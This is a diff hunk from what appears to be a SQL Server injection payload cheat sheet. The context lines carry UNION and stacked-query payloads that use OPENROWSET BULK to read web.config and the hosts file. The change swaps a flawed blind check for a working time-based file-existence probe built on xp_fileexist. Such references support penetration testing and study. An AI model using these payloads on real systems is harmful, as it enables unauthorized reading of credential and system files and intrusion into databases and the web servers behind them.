@@ -157,8 +157,8 @@ Verify paths on the target system using directory listing (`xp_dirtree`, `xp_cmd
 -- Read file via UNION injection
 ' UNION SELECT NULL, BulkColumn, NULL FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x--
 
--- Check file existence via blind injection
-'; IF (SELECT COUNT(*) FROM sys.dm_exec_requests WHERE command LIKE '%xp_fileexist%') > 0 WAITFOR DELAY '0:0:5'--
+-- Check file existence via blind injection (time-based)
+'; DECLARE @x INT; EXEC xp_fileexist 'C:\inetpub\wwwroot\web.config', @x OUTPUT; IF @x=1 WAITFOR DELAY '0:0:5'--
 
 -- Stacked query to read file
 '; SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--
